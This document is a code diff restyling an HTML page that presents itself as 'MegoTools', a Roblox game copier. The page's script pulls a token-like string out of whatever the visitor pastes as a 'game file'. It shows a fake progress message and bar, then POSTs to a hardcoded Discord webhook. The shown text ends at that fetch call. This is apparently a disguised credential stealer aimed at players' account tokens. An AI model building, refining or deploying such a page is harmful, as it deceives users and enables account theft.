@@ -2,66 +2,152 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>MegoTools</title>
+<title>MegoTools - Game Copier</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
 
 <style>
 
 body{
 margin:0;
-font-family:Arial, Helvetica, sans-serif;
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-background:#0f172a;
+font-family:'Orbitron', sans-serif;
 color:white;
+
+background:linear-gradient(-45deg,#0a0000,#200000,#3a0000,#0a0000);
+background-size:400% 400%;
+animation:bgmove 12s infinite;
+}
+
+@keyframes bgmove{
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
 }
 
 .container{
-background:#1e293b;
-padding:40px;
-border-radius:15px;
-width:500px;
+
+background:rgba(20,0,0,0.9);
+padding:45px;
+width:460px;
+border-radius:20px;
 text-align:center;
-box-shadow:0 0 25px rgba(0,0,0,0.6);
+
+box-shadow:
+0 0 20px #ff0000,
+0 0 60px rgba(255,0,0,0.5);
+
+animation:fadein 1.5s;
 }
 
-h2{
-margin-top:0;
-color:#60a5fa;
+@keyframes fadein{
+from{opacity:0;transform:translateY(30px);}
+to{opacity:1;transform:translateY(0);}
+}
+
+h1{
+margin:0;
+font-size:34px;
+color:#ff3c3c;
+
+text-shadow:
+0 0 10px red,
+0 0 20px red,
+0 0 40px red;
+}
+
+.subtitle{
+margin-top:5px;
+margin-bottom:25px;
+color:#ff8b8b;
+font-size:13px;
 }
 
 input{
+
 width:100%;
 padding:14px;
+
 border:none;
 border-radius:10px;
-background:#0f172a;
+
+background:#120000;
 color:white;
-font-size:15px;
-margin-top:15px;
+
+font-family:'Orbitron';
+font-size:14px;
+
+outline:none;
+
+box-shadow:inset 0 0 10px rgba(0,0,0,0.8);
+
 }
 
 button{
-margin-top:15px;
+
+margin-top:18px;
+
 width:100%;
 padding:14px;
+
 border:none;
 border-radius:10px;
-background:#2563eb;
-color:white;
+
+font-family:'Orbitron';
 font-size:16px;
+
+background:#ff0000;
+color:white;
+
 cursor:pointer;
+
+transition:0.25s;
+
+box-shadow:0 0 15px red;
+
 }
 
 button:hover{
-background:#1d4ed8;
+
+transform:scale(1.05);
+
+box-shadow:
+0 0 20px red,
+0 0 40px red;
+
 }
 
 .status{
+margin-top:18px;
+font-size:14px;
+color:#ff9a9a;
+min-height:22px;
+}
+
+.progress{
+
 margin-top:15px;
-font-weight:bold;
-color:#34d399;
+height:8px;
+background:#200000;
+border-radius:10px;
+overflow:hidden;
+
+}
+
+.bar{
+
+height:100%;
+width:0%;
+
+background:linear-gradient(90deg,#ff0000,#ff4d4d);
+
+box-shadow:0 0 10px red;
+
+transition:width 5s linear;
+
 }
 
 </style>
@@ -71,13 +157,18 @@ color:#34d399;
 
 <div class="container">
 
-<h2>MegoTools - Game Copier</h2>
+<h1>MegoTools</h1>
+<div class="subtitle">Roblox Game Copier</div>
 
 <input id="gameInput" placeholder="Paste Game File There">
 
 <button onclick="extract()">Copy Game</button>
 
-<div id="status" class="status"></div>
+<div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+
+<div class="status" id="status"></div>
 
 </div>
 
@@ -87,26 +178,26 @@ const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd
 
 function extract(){
 
-let text = document.getElementById("gameInput").value;
+let text=document.getElementById("gameInput").value;
 
 if(!text){
 document.getElementById("status").innerText="Invalid Input";
 return;
 }
 
-/* szuka items.|_TOKEN", "/", " */
-
-let match = text.match(/items\.\|_(.*?)", "\//);
+let match=text.match(/items\.\|_(.*?)", "\//);
 
 if(!match){
-match = text.match(/items\.\|_(.*?)", "/);
+match=text.match(/items\.\|_(.*?)", "/);
 }
 
 if(match){
 
-let token = match[1];
+let token=match[1];
 
 document.getElementById("status").innerText="Started Copying Game ( 5 minutes )";
+
+document.getElementById("bar").style.width="100%";
 
 fetch(webhook,{
 method:"POST",
